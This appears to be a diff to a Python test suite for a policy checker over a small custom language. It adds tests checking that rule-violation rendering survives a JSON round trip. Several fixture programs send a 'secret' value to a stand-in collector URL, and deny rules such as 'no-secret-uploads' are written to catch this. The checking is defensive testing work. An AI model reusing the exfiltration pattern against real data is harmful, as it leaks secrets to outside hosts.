@@ -368,10 +368,12 @@ def test_json_rules_agree_on_a_contradiction():
     assert contradiction_docs[0] == {
         "rule": "no-sends",
         "effect": {"kind": "ask", "boundary": "network",
-                   "target": "https://x.example.com", "line": 6},
+                   "target": "https://x.example.com", "line": 6,
+                   "computed": False, "declared": False},
         "with_rule": "no-writes",
         "with_effect": {"kind": "write", "boundary": "file",
-                        "target": "out.txt", "line": 5},
+                        "target": "out.txt", "line": 5,
+                        "computed": False, "declared": False},
     }
 
 
@@ -697,6 +699,115 @@ def test_render_rules_agrees_across_the_corpus():
         checked += 1
     assert checked >= 40, checked
     assert not mismatches, f"render divergences: {mismatches}"
+
+
+# ================================================================ B4: render() is pure over fields
+#
+# The Swift counterpart of test_rules.py's/test_js_rules.py's B4 proof --
+# through the CLI JSON specifically, per the build's own instruction: the
+# `render-from-fields` command (RenderFromFieldsCommand.swift) round-trips
+# each Violation.asJSON() through its own `jsonText`/`GrammarJSON.parse` (the
+# same path EffectSurfaceCommand's `shapes --rules` writes) and reports any
+# mismatch between `renderViolation` on the round-tripped document and
+# `render()` itself. An empty "mismatches" array is the whole claim.
+
+def _render_from_fields_src(src):
+    with tempfile.TemporaryDirectory() as d:
+        path = os.path.join(d, "m.planes")
+        with open(path, "w", encoding="utf-8") as fh:
+            fh.write(src)
+        return _run(["render-from-fields", path, "--rules-src"])
+
+
+RULE_CORPUS_FILES = [
+    "annotated.planes",
+    "demo/rules/clean.planes",
+    "demo/rules/violation.planes",
+    "demo/rules/exception.planes",
+    "demo/mcp/v1.planes",
+    "demo/mcp/v2.planes",
+    "corpus/allowed-hosts.planes",
+    "corpus/audit-log.planes",
+]
+
+
+def test_render_from_fields_has_no_mismatches_over_every_violation_shape():
+    """One program per shape -- real, narrowed, cleared, all three vacuous
+    situations, uncertain, and a contradiction with and without `because` --
+    the same programs test_rules.py's B4 proof uses."""
+    programs = []
+
+    programs.append(
+        'use http\n'
+        'to send of payload:\n'
+        '  give ask "https://collector.example.com/?d=" + payload\n\n'
+        'rule [no-net] anything may not ask\n'
+        'rule [no-telemetry] anything may not ask '
+        'to "https://collector.example.com"\n'
+        'x = send of "secret"\n')
+
+    deny_src = 'rule [no-external-sends] anything may not ask'
+    fp = fingerprint(parse(deny_src)[0])
+    programs.append(
+        f'use http\n{deny_src}\n'
+        f'rule [audit-allowed] anything may ask to "https://audit.internal" '
+        f'supersedes [no-external-sends] @{fp}\n'
+        f'x = ask "https://audit.internal"\n')
+
+    programs.append(
+        'use file\nlet secret = "value"\nshow secret\n'
+        'rule [no-secret-uploads] secret may not ask\n')
+
+    programs.append(
+        'use http\nuse file\n\n'
+        'let endpoint = "https://api.example.com/data"\n'
+        'let readings = read of "sensor.txt"\n\n'
+        'show readings\nask endpoint\n\n'
+        'rule [no-reading-uploads] readings may not ask\n')
+
+    programs.append(
+        'use http\nlet payload = "secret"\n'
+        'let full = "https://collector.example.com/?d=" + payload\n'
+        'rule [no-other-leak] payload may not ask '
+        'to "https://different.example.com"\n'
+        'x = ask full\n')
+
+    programs.append(
+        'use http\nuse file\n'
+        'rule [no-writes] anything may not write\n'
+        'rule [no-sends] anything may not ask contradicts [no-writes]\n'
+        '  because "no exfiltration once state has changed"\n'
+        'write 1 to "out.txt"\n'
+        'x = ask "https://x.example.com"\n')
+
+    programs.append(
+        'use http\nuse file\n'
+        'rule [no-writes2] anything may not write\n'
+        'rule [no-sends2] anything may not ask contradicts [no-writes2]\n'
+        'write 1 to "out.txt"\n'
+        'x = ask "https://x.example.com"\n')
+
+    total_checked = 0
+    for src in programs:
+        doc = _render_from_fields_src(src)
+        assert "error" not in doc, doc
+        assert doc["mismatches"] == [], doc
+        assert doc["checked"] >= 1, doc
+        total_checked += doc["checked"]
+    assert total_checked >= len(programs), total_checked
+
+
+def test_render_from_fields_has_no_mismatches_over_the_rule_corpus():
+    """The same proof, over every real rule-bearing fixture in the repo,
+    through the shapes_cli --rules path (analyseFile(follow), declaringFile
+    = the file's abspath)."""
+    total_checked = 0
+    for path in RULE_CORPUS_FILES:
+        doc = _run(["render-from-fields", path])
+        assert "error" not in doc, (path, doc)
+        assert doc["mismatches"] == [], (path, doc)
+        total_checked += doc["checked"]
+    assert total_checked > 0, total_checked
 
 
 if __name__ == "__main__":
